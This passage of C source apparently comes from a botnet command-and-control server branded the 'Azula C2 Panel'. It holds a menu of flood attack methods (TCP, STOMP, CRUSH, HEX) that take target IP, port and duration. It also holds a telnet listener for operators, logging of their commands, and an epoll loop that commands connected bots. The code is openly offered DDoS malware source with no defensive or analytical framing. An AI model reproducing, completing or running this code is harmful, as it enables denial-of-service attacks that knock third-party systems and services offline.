        sprintf(LoaderMenu_Line_5,   "\x1b[0;31mTCP     $TCP \x1b[1;37m[\x1b[1;31mIP\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPORT\x1b[1;37m] \x1b[1;37m[\x1b[0;31mTIME\x1b[1;37m] 32 [FLAGS] \x1b[1;37m[\x1b[0;31mPSIZE\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPINTERVAL\x1b[1;37m]       \x1b[1;37mTCP Attack With Desired Headers\r\n");
        sprintf(LoaderMenu_Line_6,   "\x1b[0;31mSTOMP   $STOMP \x1b[1;37m[\x1b[1;31mIP\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPORT\x1b[1;37m] \x1b[1;37m[\x1b[0;31mTIME\x1b[1;37m] 32 [FLAGS] \x1b[1;37m[\x1b[0;31mPSIZE\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPINTERVAL\x1b[1;37m]     \x1b[1;37mMixture of UDP and STD\r\n");
        sprintf(LoaderMenu_Line_7,   "\x1b[0;31mCRUSH   $CRUSH \x1b[1;37m[\x1b[1;31mIP\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPORT\x1b[1;37m] \x1b[1;37m[\x1b[0;31mTIME\x1b[1;37m] 32 [FLAGS] \x1b[1;37m[\x1b[0;31mPSIZE\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPINTERVAL\x1b[1;37m]     \x1b[1;37mMixture of STD and TCP  \r\n");
        sprintf(LoaderMenu_Line_8,   "\x1b[0;31mHEX     $HEX \x1b[1;37m[\x1b[1;31mIP\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPORT\x1b[1;37m] \x1b[1;37m[\x1b[0;31mTIME\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPACKETSIZE\x1b[1;37m]                         \x1b[1;37mModified STD Attack With Desired PacketSize\r\n");
        sprintf(LoaderMenu_Line_9,   "\x1b[0;31mSTOP    $STOP                                                        \x1b[1;37mStops your attacks.\r\n");
        if(send(thefd, LoaderMenu_Line_1, strlen(LoaderMenu_Line_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LoaderMenu_Line_2, strlen(LoaderMenu_Line_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LoaderMenu_Line_3, strlen(LoaderMenu_Line_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LoaderMenu_Line_4, strlen(LoaderMenu_Line_4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LoaderMenu_Line_5, strlen(LoaderMenu_Line_5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LoaderMenu_Line_6, strlen(LoaderMenu_Line_6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LoaderMenu_Line_7, strlen(LoaderMenu_Line_7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LoaderMenu_Line_8, strlen(LoaderMenu_Line_8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LoaderMenu_Line_9, strlen(LoaderMenu_Line_9),   MSG_NOSIGNAL) == -1) goto end;
       // pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(panel, "\x1b[1;30m[\x1b[0;31m%s\x1b[1;30m/\x1b[0;31mАзула\x1b[1;30m/\x1b[0;31m%s\x1b[1;30m]~\x1b[0;31m$\x1b[1;37m ", accounts[find_line].user, accounts[find_line].id, buf);
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
        if(strstr(buf, "STOP"))
        {
        sprintf(panel, "\x1b[1;37mAttack Stopped!\r\n");
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "CRUSH"))
        {
        sprintf(panel, "\x1b[1;37mAttack Sent using Method: [\x1b[0;31mCrush\x1b[1;37m]\r\n");           
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "TCP")) 
        {  
        sprintf(panel, "\x1b[1;37mAttack Sent using Method: [\x1b[0;31mTCP\x1b[1;37m]\r\n");           
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "UDP")) 
        {  
        sprintf(panel, "\x1b[1;37mAttack Sent using Method: [\x1b[0;31mUDP\x1b[1;37m]\r\n");           
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "STD")) 
        {  
        sprintf(panel, "\x1b[1;37mAttack Sent using Method: [\x1b[0;31mSTD\x1b[1;37m]\r\n");
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "STOMP")) 
        {  
        sprintf(panel, "\x1b[1;37mAttack Sent using Method: [\x1b[0;31mSTOMP\x1b[1;37m]\r\n");
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "Azula")) 
        {  
        sprintf(panel, "\x1b[1;37mAttack Sent using Method: [\x1b[0;31mAzula\x1b[1;37m]\r\n");
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) return;
        }  
        if (strstr(buf, "EXIT") || strstr(buf, "exit"))  
        { 
        goto end; 
        } 
        trim(buf);
        sprintf(panel, "\x1b[1;30m[\x1b[0;31m%s\x1b[1;30m/\x1b[0;31mАзула\x1b[1;30m/\x1b[0;31m%s\x1b[1;30m]~\x1b[0;31m$\x1b[1;37m ", accounts[find_line].user, accounts[find_line].id, buf);
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("\x1b[1;37m[\x1b[0;31mАзула\x1b[1;37m] User:[\x1b[0;31m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;31m%s\x1b[1;37m]\n",accounts[find_line].user, buf);
        memset(buf, 0, 2048);
        } 
        end:    
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *CStateHandler(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\x1b[0;31mAzula\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  
        printf("\x1b[1;37m[\x1b[0;31mAzula\x1b[1;37m] Incoming User Connection - User: [\x1b[0;31mN/A\x1b[1;37m] Host: ");
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("Azula_Connection.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mAzula\x1b[1;37m] Incoming User Connection From [%d.%d.%d.%d\x1b[1;37m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86) || defined(__i486__) || defined(__i586__) || defined(__i686__)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__)
    return "Arm2";
    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "Arm3";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4T";
    #elif defined(__ARM_ARCH_5__) || defined(__ARM_ARCH_5E__)
    return "Arm5";
    #elif defined(__ARM_ARCH_5T__) || defined(__ARM_ARCH_5TE__) || defined(__ARM_ARCH_5TEJ__)
    return "Arm5T";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "Arm6";
    #elif defined(__ARM_ARCH_6T2__)
    return "Arm6T2";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";
    #elif defined(__bfn) || defined(__DFIN__)
    return "BlackFin";
    #elif defined(__convex__)
    return "Convex";
    #elif defined(__epiphany__)
    return "Epiphany";
    #elif defined(__hppa__) || defined(__HPPA__) || defined(__hppa)
    return "HP/PA RISC";
    #elif defined (__ia64__) || defined(_IA64) || defined(__IA64__)
    return "Intel Itanium (IA-64)";
    #elif defined(__370__) || defined(__THW_370__)
    return "SystemZ";
    #elif defined(_TMS320C2XX) || defined(__TMS320C2000__)
    return "TSM320";
    #elif defined(__TSM470__)
    return "TMS470";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "Mipsel";
    #elif defined(__sh__)
    return "Sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";
    #elif defined(__m68k__)
    return "M68k";
    #elif defined(__arc__)
    return "Arc";
    #else
    return "Unknown Architecture";
    #endif
}
char *getFiles()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "Python";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "Python3";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "Perl";
                } else {
        return "Unknown File";
        }
}
char *getDevice()
{
        if(access("usr/sbin/telnetd", F_OK) != -1){
        return "Telnet";
        }
        if(access("usr/sbin/sshd", F_OK) != -1){
        return "SSH";
        } else {
        return "Unknown Device";
        }
}
char *getPortz()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "22";
        }
        if(access("/usr/sbin/telnetd", F_OK) != -1){
        return "22";
        } else {
        return "Unknown Port";
        }
}
char *getDistro()
{
        if(access("/usr/bin/apt-get", F_OK) != -1){
        return "Ubuntu/Debian";
        }
        if(access("/usr/lib/portage", F_OK) != -1){
        return "Gentoo";
        }
        if(access("/usr/bin/yum", F_OK) != -1){
        return "REHL/Centos";
        }
        if(access("/var/lib/YaST2", F_OK) != -1){
        return "Open Suse";
        } else {
        return "Unknown Distro";
        }
}
char *getSys() 
{
    #if defined(__gnu_linux__) || defined(__linux__) || defined(linux) || defined(__linux)
    return "Linux";
    #elif defined(_WIN32)
    return "Windows (32)";
    #elif defined(_WIN64)
    return "Windows (64)";
    #elif defined(_TARGET_OS_EMBEDDED)
    return "iOS Embedded";
    #elif defined(TARGET_IPHONE_SIMULATOR)
    return "iOS Simulator";
    #elif defined(TARGED_OS_IPHONE)
    return "iPhone";
    #elif defined(TARGET_OS_MAC)
    return "Mac";
    #elif defined(_ANDROID_)
    return "Android";
    #elif defined(__sun)
    return "Solaris";
    #elif defined(__hpux)
    return "HPUX";
    #elif defined(__DragonFly__)
    return "DragonFly-BSD";
    #elif defined(__FreeBSD__)
    return "Free-BSD";
    #elif defined(__NetBSD__)
    return "Net-BSD";
    #elif defined(__OpenBSD__)
    return "Open-BSD";
    #elif defined(__unix__)
    return "Other UNIX OS";
    else
    return "Unidentified OS";
    #endif
}

int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("\x1b[1;37m[\x1b[0;31mAzula\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        char hostname[1024];
        hostname[1023] = '\0';
        gethostname(hostname, 1023);
        struct hostent* h;
        h = gethostbyname(hostname);
        #define Methods "null"
        #define Logs "null"
        #define ExternalScripts "null"
        #define APIs "null"
        #define Directories "null"
        #define PKiller "null"
        #define Installers "null"
        #define ALogs "null"
        printf("\x1b[0;31m╔══════════════════════════════════════════════╗\r\n");
        printf("\x1b[0;31m║       \x1b[1;37mWelcome to the Azula C2 Panel          \x1b[0;31m║\r\n");
        printf("\x1b[0;31m╠══════════════════════════════════════════════╣\r\n");
        printf("\x1b[0;31m║              \x1b[1;37mServer Information              \x1b[0;31m║\r\n");
        printf("\x1b[0;31m╠══════════════════════════════════════════════╝\r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mOperating System: [\x1b[0;31m%s\x1b[1;37m]                        \r\n", getSys());
        printf("\x1b[0;31m╠═\x1b[1;37mDistro: [\x1b[0;31m%s\x1b[1;37m]                                  \r\n", getDistro());
        printf("\x1b[0;31m╠═\x1b[1;37mFree Memory: [\x1b[0;31mnull\x1b[1;37m]                           \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mArchitecture: [\x1b[0;31m%s\x1b[1;37m]                            \r\n", getArch());
        printf("\x1b[0;31m╠═\x1b[1;37mSysF: [\x1b[0;31m%s\x1b[1;37m]                     \r\n", getFiles());
        printf("\x1b[0;31m╠═\x1b[1;37mSysP: [\x1b[0;31m%s\x1b[1;37m]                      \r\n", getPortz());
        printf("\x1b[0;31m╠═\x1b[1;37mSysD: [\x1b[0;31m%s\x1b[1;37m]                      \r\n", getDevice());
        //printf("\x1b[0;31m╠═\x1b[1;37mStatic Hostname: [\x1b[0;31m%s\x1b[1;37m]                         \r\n", h->h_name);
        printf("\x1b[0;31m╠══════════════════════════════════════════════╗\r\n");
        printf("\x1b[0;31m║              \x1b[1;37mC2 Server Information           \x1b[0;31m║\r\n");
        printf("\x1b[0;31m╠══════════════════════════════════════════════╝\r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mVStack(s): [\x1b[0;31m%d\x1b[1;37m]                               \r\n", clientsConnected());
        printf("\x1b[0;31m╠═\x1b[1;37mAdministrators: [\x1b[0;31m%d\x1b[1;37m]                          \r\n", managesConnected);
        printf("\x1b[0;31m╠═\x1b[1;37mC2_Setup_BP: [\x1b[0;31m%d\x1b[1;37m]                  \r\n", s);
        printf("\x1b[0;31m╠═\x1b[1;37mC2_Setup_CP: [\x1b[0;31m%d\x1b[1;37m]                  \r\n", port);
        printf("\x1b[0;31m╠═\x1b[1;37mC2_Setup_TR: [\x1b[0;31m%d\x1b[1;37m]                  \r\n", threads);
        printf("\x1b[0;31m╠═\x1b[1;37mUser Log File: [\x1b[0;31mAzula.txt\x1b[1;37m]                    \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mSupport VNDS: [\x1b[0;31mReapers_Plague\x1b[1;37m]                \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mAdministrator Log File: [\x1b[0;31m"ALogs"\x1b[1;37m] \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mLogs: [\x1b[0;31m"Logs"\x1b[1;37m]  \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mMethods: [\x1b[0;31m"Methods"\x1b[1;37m]  \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mExternal Scripts: [\x1b[0;31m"ExternalScripts"\x1b[1;37m] \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mInstallers: [\x1b[0;31m"Installers"\x1b[1;37m]  \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mAPIs: [\x1b[0;31m"APIs"\x1b[1;37m]  \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mProcess Killers: [\x1b[0;31m"PKiller"\x1b[1;37m]  \r\n");
        printf("\x1b[0;31m╠═\x1b[1;37mDirectories: [\x1b[0;31m"Directories"\x1b[1;37m]  \r\n");
        printf("\x1b[0;31m╚═\x1b[1;37mCreation Date: [\x1b[0;31m7/27/2020\x1b[1;37m]  \r\n");
        listenFD = create_and_bind(argv[1]); 
        if (listenFD == -1) abort();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &CStateHandler, port);
        while(1)
        {
        sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
